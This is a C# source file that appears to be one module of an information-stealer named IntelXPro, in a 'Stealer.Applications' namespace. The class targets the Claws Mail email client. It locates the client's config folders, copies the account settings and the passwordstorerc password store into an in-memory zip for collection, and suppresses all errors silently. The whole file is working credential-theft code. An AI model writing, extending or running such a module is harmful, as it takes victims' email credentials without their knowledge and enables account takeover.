using IntelXPro.src.IntelXPro.Dependencies.Data;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Applications
{
    internal class ClawsMail : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string appDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Claws-mail");
            string userProfilePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), ".claws-mail");

            Counter.CounterApplications counterApplications = new Counter.CounterApplications();
            counterApplications.Name = "ClawsMail";

            bool foundData = false;

            if (Directory.Exists(appDataPath))
            {
                foundData |= CollectFromDirectory(appDataPath, "AppData", zip, counterApplications);
            }

            if (Directory.Exists(userProfilePath))
            {
                foundData |= CollectFromDirectory(userProfilePath, "UserProfile", zip, counterApplications);
            }

            if (foundData && counterApplications.Files.Count > 0)
            {
                counter.Applications.Add(counterApplications);
            }
        }

        private bool CollectFromDirectory(string basePath, string location, InMemoryZip zip, Counter.CounterApplications counterApplications)
        {
            bool foundData = false;

            try
            {
                string[] configFiles = new string[]
                {
                    "accountrc",
                    "folderlist.xml",
                    "clawsrc"
                };

                foreach (string configFile in configFiles)
                {
                    string fullPath = Path.Combine(basePath, configFile);
                    if (File.Exists(fullPath))
                    {
                        string zipPath = $"Applications\\ClawsMail\\{location}\\{configFile}";
                        zip.AddFile(zipPath, File.ReadAllBytes(fullPath));
                        counterApplications.Files.Add(fullPath + " => " + zipPath);
                        foundData = true;
                    }
                }

                string passwordFile = Path.Combine(basePath, "passwordstorerc");
                if (File.Exists(passwordFile))
                {
                    string zipPath = $"Applications\\ClawsMail\\{location}\\passwordstorerc";
                    zip.AddFile(zipPath, File.ReadAllBytes(passwordFile));
                    counterApplications.Files.Add(passwordFile + " => " + zipPath);
                    foundData = true;
                }
            }
            catch
            {
            }

            return foundData;
        }
    }
}
